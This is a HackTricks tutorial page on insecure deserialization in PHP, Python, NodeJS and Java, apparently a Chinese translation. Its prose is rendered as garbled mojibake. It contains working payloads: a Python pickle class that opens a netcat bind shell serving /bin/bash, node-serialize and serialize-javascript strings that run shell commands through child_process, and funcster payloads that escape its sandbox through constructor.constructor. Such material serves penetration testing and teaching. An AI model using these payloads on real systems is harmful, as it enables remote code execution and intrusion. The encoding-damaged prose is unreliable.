# Deserialization

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

**åºåˆ—åŒ–** è¢«ç†è§£ä¸ºå°†å¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥ä¿å­˜çš„æ ¼å¼çš„æ–¹æ³•ï¼Œç›®çš„æ˜¯å­˜å‚¨å¯¹è±¡æˆ–å°†å…¶ä½œä¸ºé€šä¿¡è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†è¿›è¡Œä¼ è¾“ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºç¡®ä¿å¯¹è±¡å¯ä»¥åœ¨ç¨åæ—¶é—´é‡æ–°åˆ›å»ºï¼Œä¿æŒå…¶ç»“æ„å’ŒçŠ¶æ€ã€‚

**ååºåˆ—åŒ–** åˆ™æ˜¯æŠµæ¶ˆåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚å®ƒæ¶‰åŠå°†ä»¥ç‰¹å®šæ ¼å¼ç»“æ„åŒ–çš„æ•°æ®é‡æ–°æ„å»ºä¸ºå¯¹è±¡ã€‚

ååºåˆ—åŒ–å¯èƒ½æ˜¯å±é™©çš„ï¼Œå› ä¸ºå®ƒå¯èƒ½ **å…è®¸æ”»å‡»è€…æ“çºµåºåˆ—åŒ–æ•°æ®ä»¥æ‰§è¡Œæœ‰å®³ä»£ç ** æˆ–åœ¨å¯¹è±¡é‡å»ºè¿‡ç¨‹ä¸­å¯¼è‡´åº”ç”¨ç¨‹åºå‡ºç°æ„å¤–è¡Œä¸ºã€‚

## PHP

åœ¨ PHP ä¸­ï¼Œç‰¹å®šçš„é­”æœ¯æ–¹æ³•åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«ä½¿ç”¨ï¼š

* `__sleep`ï¼šåœ¨å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚æ­¤æ–¹æ³•åº”è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å¯¹è±¡å±æ€§çš„åç§°ã€‚å®ƒé€šå¸¸ç”¨äºæäº¤å¾…å¤„ç†çš„æ•°æ®æˆ–æ‰§è¡Œç±»ä¼¼çš„æ¸…ç†ä»»åŠ¡ã€‚
* `__wakeup`ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚å®ƒç”¨äºé‡æ–°å»ºç«‹åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯èƒ½ä¸¢å¤±çš„ä»»ä½•æ•°æ®åº“è¿æ¥ï¼Œå¹¶æ‰§è¡Œå…¶ä»–é‡æ–°åˆå§‹åŒ–ä»»åŠ¡ã€‚
* `__unserialize`ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨æ­¤æ–¹æ³•ï¼Œè€Œä¸æ˜¯ `__wakeup`ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ä¸ `__wakeup` ç›¸æ¯”ï¼Œå®ƒå¯¹ååºåˆ—åŒ–è¿‡ç¨‹æä¾›äº†æ›´å¤šæ§åˆ¶ã€‚
* `__destruct`ï¼šåœ¨å¯¹è±¡å³å°†è¢«é”€æ¯æˆ–è„šæœ¬ç»“æŸæ—¶è°ƒç”¨æ­¤æ–¹æ³•ã€‚å®ƒé€šå¸¸ç”¨äºæ¸…ç†ä»»åŠ¡ï¼Œå¦‚å…³é—­æ–‡ä»¶å¥æŸ„æˆ–æ•°æ®åº“è¿æ¥ã€‚
* `__toString`ï¼šæ­¤æ–¹æ³•å…è®¸å°†å¯¹è±¡è§†ä¸ºå­—ç¬¦ä¸²ã€‚å®ƒå¯ä»¥ç”¨äºè¯»å–æ–‡ä»¶æˆ–å…¶ä»–åŸºäºå…¶ä¸­å‡½æ•°è°ƒç”¨çš„ä»»åŠ¡ï¼Œæœ‰æ•ˆåœ°æä¾›å¯¹è±¡çš„æ–‡æœ¬è¡¨ç¤ºã€‚
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
å¦‚æœä½ æŸ¥çœ‹ç»“æœï¼Œä½ ä¼šå‘ç°å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå‡½æ•° **`__wakeup`** å’Œ **`__destruct`** è¢«è°ƒç”¨ã€‚è¯·æ³¨æ„ï¼Œåœ¨ä¸€äº›æ•™ç¨‹ä¸­ï¼Œä½ ä¼šå‘ç°å½“å°è¯•æ‰“å°æŸä¸ªå±æ€§æ—¶ï¼Œ**`__toString`** å‡½æ•°è¢«è°ƒç”¨ï¼Œä½†æ˜¾ç„¶è¿™ **ä¸å†å‘ç”Ÿ**ã€‚

{% hint style="warning" %}
å¦‚æœåœ¨ç±»ä¸­å®ç°äº†æ–¹æ³• **`__unserialize(array $data)`**ï¼Œåˆ™ä¼š **è°ƒç”¨è¯¥æ–¹æ³•è€Œä¸æ˜¯ `__wakeup()`**ã€‚å®ƒå…è®¸ä½ é€šè¿‡æä¾›åºåˆ—åŒ–æ•°æ®ä½œä¸ºæ•°ç»„æ¥ååºåˆ—åŒ–å¯¹è±¡ã€‚ä½ å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥ååºåˆ—åŒ–å±æ€§å¹¶åœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»ä½•å¿…è¦çš„ä»»åŠ¡ã€‚
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

æ‚¨å¯ä»¥åœ¨è¿™é‡Œé˜…è¯»ä¸€ä¸ªè§£é‡Šè¿‡çš„ **PHP ç¤ºä¾‹**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)ï¼Œåœ¨è¿™é‡Œ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) æˆ–åœ¨è¿™é‡Œ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP ååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»

æ‚¨å¯ä»¥æ»¥ç”¨ PHP è‡ªåŠ¨åŠ è½½åŠŸèƒ½æ¥åŠ è½½ä»»æ„ php æ–‡ä»¶ç­‰:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### åºåˆ—åŒ–å¼•ç”¨å€¼

å¦‚æœå‡ºäºæŸç§åŸå› æ‚¨æƒ³å°†ä¸€ä¸ªå€¼åºåˆ—åŒ–ä¸º **å¯¹å¦ä¸€ä¸ªåºåˆ—åŒ–å€¼çš„å¼•ç”¨**ï¼Œæ‚¨å¯ä»¥:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) å¯ä»¥å¸®åŠ©ä½ ç”Ÿæˆæœ‰æ•ˆè½½è·ä»¥æ»¥ç”¨ PHP ååºåˆ—åŒ–ã€‚\
è¯·æ³¨æ„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½  **æ— æ³•åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ä¸­æ‰¾åˆ°æ»¥ç”¨ååºåˆ—åŒ–çš„æ–¹æ³•**ï¼Œä½†ä½ å¯èƒ½èƒ½å¤Ÿ **æ»¥ç”¨å¤–éƒ¨ PHP æ‰©å±•çš„ä»£ç ã€‚**\
å› æ­¤ï¼Œå¦‚æœå¯ä»¥ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çš„ `phpinfo()` å¹¶ **åœ¨äº’è”ç½‘ä¸Šæœç´¢**ï¼ˆç”šè‡³åœ¨ **PHPGGC** çš„ **gadgets** ä¸­ï¼‰ä¸€äº›ä½ å¯ä»¥æ»¥ç”¨çš„å¯èƒ½çš„ gadgetã€‚

### phar:// metadata deserialization

å¦‚æœä½ å‘ç°ä¸€ä¸ª LFI åªæ˜¯è¯»å–æ–‡ä»¶è€Œä¸æ‰§è¡Œå…¶ä¸­çš„ PHP ä»£ç ï¼Œä¾‹å¦‚ä½¿ç”¨ _**file\_get\_contents(), fopen(), file() æˆ– file\_exists(), md5\_file(), filemtime() æˆ– filesize()**_**ã€‚ä½ å¯ä»¥å°è¯•æ»¥ç”¨åœ¨ä½¿ç”¨ **phar** åè®®æ—¶ **è¯»å–** **æ–‡ä»¶** æ—¶å‘ç”Ÿçš„ **ååºåˆ—åŒ–**ã€‚\
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»ä»¥ä¸‹å¸–å­ï¼š

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå‡½æ•° _\_\_reduce\_\__ å°†è¢«æ‰§è¡Œã€‚\
å½“è¢«åˆ©ç”¨æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
æœ‰å…³ä» **pickle jails** ä¸­é€ƒè„±çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ä»¥ä¸‹é¡µé¢ä»‹ç»äº†åœ¨ **yamls** python åº“ä¸­ **æ»¥ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–** çš„æŠ€æœ¯ï¼Œå¹¶ä»¥ä¸€ä¸ªå¯ä»¥ç”¨äºç”Ÿæˆ **Pickle, PyYAML, jsonpickle å’Œ ruamel.yaml** çš„ RCE ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½çš„å·¥å…·ç»“æŸï¼š

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### ç±»æ±¡æŸ“ (Python åŸå‹æ±¡æŸ“)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS é­”æ³•å‡½æ•°

JS **æ²¡æœ‰åƒ PHP æˆ– Python é‚£æ ·çš„ "é­”æ³•" å‡½æ•°**ï¼Œè¿™äº›å‡½æ•°ä»…ç”¨äºåˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œã€‚ä½†å®ƒæœ‰ä¸€äº› **å‡½æ•°**ï¼Œå³ä½¿æ²¡æœ‰ç›´æ¥è°ƒç”¨å®ƒä»¬ä¹Ÿ **ç»å¸¸ä½¿ç”¨**ï¼Œä¾‹å¦‚ **`toString`**ã€**`valueOf`**ã€**`toJSON`**ã€‚\
å¦‚æœæ»¥ç”¨ååºåˆ—åŒ–ï¼Œä½ å¯ä»¥ **å¦¥åè¿™äº›å‡½æ•°ä»¥æ‰§è¡Œå…¶ä»–ä»£ç **ï¼ˆå¯èƒ½æ»¥ç”¨åŸå‹æ±¡æŸ“ï¼‰ï¼Œå½“å®ƒä»¬è¢«è°ƒç”¨æ—¶ï¼Œä½ å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

å¦ä¸€ç§ **"é­”æ³•" è°ƒç”¨å‡½æ•°** çš„æ–¹å¼æ˜¯é€šè¿‡ **å¦¥åä¸€ä¸ªç”±å¼‚æ­¥å‡½æ•°**ï¼ˆpromiseï¼‰**è¿”å›çš„å¯¹è±¡**ã€‚å› ä¸ºï¼Œå¦‚æœä½  **å°†**é‚£ä¸ª **è¿”å›å¯¹è±¡** è½¬æ¢ä¸ºå¦ä¸€ä¸ª **promise**ï¼Œå¹¶å…·æœ‰ä¸€ä¸ªåä¸º **"then" çš„å‡½æ•°ç±»å‹å±æ€§**ï¼Œå®ƒå°†ä»…å› ä¸ºå®ƒæ˜¯ç”±å¦ä¸€ä¸ª promise è¿”å›è€Œè¢« **æ‰§è¡Œ**ã€‚_æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·_ [_**ç‚¹å‡»æ­¤é“¾æ¥**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _ã€‚_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` å’Œ `prototype` æ±¡æŸ“

å¦‚æœä½ æƒ³äº†è§£è¿™ä¸ªæŠ€æœ¯ **è¯·æŸ¥çœ‹ä»¥ä¸‹æ•™ç¨‹**ï¼š

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

è¿™ä¸ªåº“å…è®¸åºåˆ—åŒ–å‡½æ•°ã€‚ç¤ºä¾‹ï¼š
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
è¯¥ **åºåˆ—åŒ–å¯¹è±¡** çœ‹èµ·æ¥åƒï¼š
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
æ‚¨å¯ä»¥åœ¨ç¤ºä¾‹ä¸­çœ‹åˆ°ï¼Œå½“ä¸€ä¸ªå‡½æ•°è¢«åºåˆ—åŒ–æ—¶ï¼Œ`_$$ND_FUNC$$_` æ ‡å¿—ä¼šé™„åŠ åˆ°åºåˆ—åŒ–å¯¹è±¡ä¸Šã€‚

åœ¨æ–‡ä»¶ `node-serialize/lib/serialize.js` ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç›¸åŒçš„æ ‡å¿—ä»¥åŠä»£ç å¦‚ä½•ä½¿ç”¨å®ƒã€‚

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

æ­£å¦‚æ‚¨åœ¨æœ€åä¸€æ®µä»£ç ä¸­çœ‹åˆ°çš„ï¼Œ**å¦‚æœæ‰¾åˆ°æ ‡å¿—**ï¼Œåˆ™ä½¿ç”¨ `eval` æ¥ååºåˆ—åŒ–å‡½æ•°ï¼Œå› æ­¤åŸºæœ¬ä¸Š**ç”¨æˆ·è¾“å…¥è¢«ç”¨äº `eval` å‡½æ•°å†…éƒ¨**ã€‚

ç„¶è€Œï¼Œ**ä»…ä»…åºåˆ—åŒ–**ä¸€ä¸ªå‡½æ•°**å¹¶ä¸ä¼šæ‰§è¡Œå®ƒ**ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­éœ€è¦æŸéƒ¨åˆ†ä»£ç **è°ƒç”¨ `y.rce`**ï¼Œè¿™éå¸¸**ä¸å¯èƒ½**ã€‚\
æ— è®ºå¦‚ä½•ï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡**ï¼Œ**æ·»åŠ ä¸€äº›æ‹¬å·**ï¼Œä»¥ä¾¿åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œåºåˆ—åŒ–çš„å‡½æ•°ã€‚\
åœ¨ä¸‹ä¸€æ®µä»£ç ä¸­**æ³¨æ„æœ€åçš„æ‹¬å·**ä»¥åŠ `unserialize` å‡½æ•°å°†å¦‚ä½•è‡ªåŠ¨æ‰§è¡Œä»£ç ï¼š
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
å¦‚å‰æ‰€è¿°ï¼Œè¯¥åº“å°†åœ¨`_$$ND_FUNC$$_`ä¹‹åè·å–ä»£ç å¹¶å°†**æ‰§è¡Œå®ƒ**ï¼Œä½¿ç”¨`eval`ã€‚å› æ­¤ï¼Œä¸ºäº†**è‡ªåŠ¨æ‰§è¡Œä»£ç **ï¼Œæ‚¨å¯ä»¥**åˆ é™¤å‡½æ•°åˆ›å»º**éƒ¨åˆ†å’Œæœ€åä¸€ä¸ªæ‹¬å·ï¼Œå¹¶**ä»…æ‰§è¡Œä¸€ä¸ª JS å•è¡Œä»£ç **ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
æ‚¨å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **æ›´å¤šä¿¡æ¯**ï¼Œå…³äºå¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´ã€‚

### [funcster](https://www.npmjs.com/package/funcster)

**funcster** çš„ä¸€ä¸ªæ˜¾è‘—ç‰¹ç‚¹æ˜¯ **æ ‡å‡†å†…ç½®å¯¹è±¡** çš„ä¸å¯è®¿é—®æ€§ï¼›å®ƒä»¬è¶…å‡ºäº†å¯è®¿é—®èŒƒå›´ã€‚æ­¤é™åˆ¶é˜»æ­¢äº†å°è¯•åœ¨å†…ç½®å¯¹è±¡ä¸Šè°ƒç”¨æ–¹æ³•çš„ä»£ç æ‰§è¡Œï¼Œå½“ä½¿ç”¨ `console.log()` æˆ– `require(something)` ç­‰å‘½ä»¤æ—¶ï¼Œä¼šå¯¼è‡´ `"ReferenceError: console is not defined"` ç­‰å¼‚å¸¸ã€‚

å°½ç®¡æœ‰æ­¤é™åˆ¶ï¼Œä½†é€šè¿‡ç‰¹å®šæ–¹æ³•å¯ä»¥æ¢å¤å¯¹å…¨å±€ä¸Šä¸‹æ–‡çš„å®Œå…¨è®¿é—®ï¼ŒåŒ…æ‹¬æ‰€æœ‰æ ‡å‡†å†…ç½®å¯¹è±¡ã€‚é€šè¿‡ç›´æ¥åˆ©ç”¨å…¨å±€ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ç‰‡æ®µé‡æ–°å»ºç«‹è®¿é—®ï¼š
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**æœ‰å…³**[ **æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»æ­¤æ¥æº**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** åŒ…ä¸“é—¨ç”¨äºåºåˆ—åŒ–ç›®çš„ï¼Œç¼ºä¹ä»»ä½•å†…ç½®çš„ååºåˆ—åŒ–åŠŸèƒ½ã€‚ç”¨æˆ·éœ€è‡ªè¡Œå®ç°ååºåˆ—åŒ–çš„æ–¹æ³•ã€‚å®˜æ–¹ç¤ºä¾‹å»ºè®®ç›´æ¥ä½¿ç”¨ `eval` æ¥ååºåˆ—åŒ–åºåˆ—åŒ–çš„æ•°æ®ï¼š
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
å¦‚æœè¿™ä¸ªå‡½æ•°ç”¨äºååºåˆ—åŒ–å¯¹è±¡ï¼Œä½ å¯ä»¥**è½»æ¾åˆ©ç”¨å®ƒ**ï¼š
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»æ­¤æ¥æº**[ **æ›´å¤šä¿¡æ¯é˜…è¯»æ­¤æ¥æº**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryoåº“

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åº“ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„ä¿¡æ¯ï¼š

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

åœ¨Javaä¸­ï¼Œ**ååºåˆ—åŒ–å›è°ƒåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œ**ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ‰§è¡Œè¿‡ç¨‹ï¼Œé€šè¿‡æ„é€ æ¶æ„æœ‰æ•ˆè´Ÿè½½æ¥è§¦å‘è¿™äº›å›è°ƒï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„æœ‰å®³æ“ä½œæ‰§è¡Œã€‚

### æŒ‡çº¹

#### ç™½ç›’

è¦è¯†åˆ«ä»£ç åº“ä¸­æ½œåœ¨çš„åºåˆ—åŒ–æ¼æ´ï¼Œè¯·æœç´¢ï¼š

* å®ç°äº†`Serializable`æ¥å£çš„ç±»ã€‚
* ä½¿ç”¨`java.io.ObjectInputStream`ã€`readObject`ã€`readUnshare`å‡½æ•°ã€‚

ç‰¹åˆ«æ³¨æ„ï¼š

* `XMLDecoder`ä¸å¤–éƒ¨ç”¨æˆ·å®šä¹‰çš„å‚æ•°ä¸€èµ·ä½¿ç”¨ã€‚
* `XStream`çš„`fromXML`æ–¹æ³•ï¼Œç‰¹åˆ«æ˜¯å½“XStreamç‰ˆæœ¬å°äºæˆ–ç­‰äº1.46æ—¶ï¼Œå› ä¸ºå®ƒå®¹æ˜“å—åˆ°åºåˆ—åŒ–é—®é¢˜çš„å½±å“ã€‚
* `ObjectInputStream`ä¸`readObject`æ–¹æ³•ç»“åˆä½¿ç”¨ã€‚
* å®ç°`readObject`ã€`readObjectNodData`ã€`readResolve`æˆ–`readExternal`ç­‰æ–¹æ³•ã€‚
* `ObjectInputStream.readUnshared`ã€‚
* ä¸€èˆ¬ä½¿ç”¨`Serializable`ã€‚

#### é»‘ç›’

å¯¹äºé»‘ç›’æµ‹è¯•ï¼Œå¯»æ‰¾ç‰¹å®šçš„**ç­¾åæˆ–â€œé­”æ³•å­—èŠ‚â€**ï¼Œä»¥è¡¨ç¤ºæ¥è‡ª`ObjectInputStream`çš„Javaåºåˆ—åŒ–å¯¹è±¡ï¼š

* åå…­è¿›åˆ¶æ¨¡å¼ï¼š`AC ED 00 05`ã€‚
* Base64æ¨¡å¼ï¼š`rO0`ã€‚
* HTTPå“åº”å¤´ä¸­`Content-type`è®¾ç½®ä¸º`application/x-java-serialized-object`ã€‚
* è¡¨ç¤ºå…ˆå‰å‹ç¼©çš„åå…­è¿›åˆ¶æ¨¡å¼ï¼š`1F 8B 08 00`ã€‚
* è¡¨ç¤ºå…ˆå‰å‹ç¼©çš„Base64æ¨¡å¼ï¼š`H4sIA`ã€‚
* å…·æœ‰`.faces`æ‰©å±•åçš„Webæ–‡ä»¶å’Œ`faces.ViewState`å‚æ•°ã€‚åœ¨Webåº”ç”¨ç¨‹åºä¸­å‘ç°è¿™äº›æ¨¡å¼åº”æç¤ºè¿›è¡Œè¯¦ç»†æ£€æŸ¥ï¼Œå¦‚[å…³äºJava JSF ViewStateååºåˆ—åŒ–çš„å¸–å­](java-jsf-viewstate-.faces-deserialization.md)æ‰€è¿°ã€‚
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´

å¦‚æœä½ æƒ³è¦**äº†è§£Javaååºåˆ—åŒ–æ¼æ´æ˜¯å¦‚ä½•å·¥ä½œçš„**ï¼Œä½ åº”è¯¥æŸ¥çœ‹[**åŸºæœ¬Javaååºåˆ—åŒ–**](basic-java-deserialization-objectinputstream-readobject.md)ã€[**Java DNSååºåˆ—åŒ–**](java-dns-deserialization-and-gadgetprobe.md)å’Œ[**CommonsCollection1æœ‰æ•ˆè½½è·**](java-transformers-to-rutime-exec-payload.md)ã€‚

#### ç™½ç›’æµ‹è¯•

ä½ å¯ä»¥æ£€æŸ¥æ˜¯å¦å®‰è£…äº†ä»»ä½•å…·æœ‰å·²çŸ¥æ¼æ´çš„åº”ç”¨ç¨‹åºã€‚
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ä½ å¯ä»¥å°è¯•**æ£€æŸ¥æ‰€æœ‰å·²çŸ¥çš„è„†å¼±åº“**ï¼Œå¹¶ä¸”[**Ysoserial**](https://github.com/frohoff/ysoserial)å¯ä»¥æä¾›ä¸€ä¸ªåˆ©ç”¨ã€‚æˆ–è€…ä½ å¯ä»¥æ£€æŸ¥[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ä¸ŠæŒ‡ç¤ºçš„åº“ã€‚\
ä½ è¿˜å¯ä»¥ä½¿ç”¨[**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)æ¥æœç´¢å¯èƒ½è¢«åˆ©ç”¨çš„gadgeté“¾ã€‚\
